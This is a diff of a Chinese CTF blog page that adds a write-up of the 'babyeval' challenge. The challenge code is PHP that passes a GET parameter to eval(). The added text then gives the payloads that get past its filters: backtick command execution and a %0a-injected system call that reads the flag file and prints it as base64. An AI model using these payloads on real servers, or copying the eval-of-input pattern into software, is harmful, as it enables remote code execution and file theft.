@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.7k 字
+      1.9k 字
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      25
+      28
        分钟
     </span>
   
@@ -241,7 +241,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：11 分钟前
+                  本文最后更新于：8 天前
                 
               </p>
             
@@ -507,6 +507,40 @@ getVars();
 <span class="hljs-comment">//var3=$&#123;$var1&#125;=$&#123;phpinfo&#125;</span></code></pre></div>
 
 <p>flag藏在phpinfo中，ctrl+f搜素flag即可</p>
+<h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-comment">// flag在flag.php</span>
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>]))&#123;
+        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/\(.*\)/'</span>, $_GET[<span class="hljs-string">'a'</span>]))
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">'hacker!!!'</span>);
+        ob_start(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">($data)</span></span>&#123;
+                 <span class="hljs-keyword">if</span> (strpos($data, <span class="hljs-string">'flag'</span>) !== <span class="hljs-keyword">false</span>)
+                 <span class="hljs-keyword">return</span> <span class="hljs-string">'ByeBye hacker'</span>;
+                 <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+                 &#125;);
+        <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'a'</span>]);
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        highlight_file(<span class="hljs-keyword">__FILE__</span>);
+    &#125;
+    <span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>看下代码</p>
+<blockquote>
+<p>1.get 提交一个参数a</p>
+<p>2.正则过滤，a中不能包含（）</p>
+<p>3.function($data)，这个函数过滤了flag字段，所以行业不能包含flag</p>
+<p>4.绕过上面两个后就可以执行eval()</p>
+</blockquote>
+<p>可以使用echo配合``绕过上面的检测</p>
+<div class="hljs"><pre><code class="hljs autohotkey">echo `base64 f*`;</code></pre></div>
+
+<p>但是一般想到的应该是</p>
+<div class="hljs"><pre><code class="hljs abnf">system(<span class="hljs-string">"cat /flag.php"</span>)<span class="hljs-comment">;</span></code></pre></div>
+
+<p>可以利用%0a绕过，%0a对应的ascii码为换行符，并且为base64格式显示，不然会被拦截</p>
+<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=system(<span class="hljs-string">"%0acat /f*|%20base64"</span>)<span class="hljs-comment">;</span></code></pre></div>
+
+
+
 
             </div>
             <hr>
@@ -536,6 +570,12 @@ getVars();
                 <div class="post-prevnext row">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2020/11/27/attack/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">arp attack</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
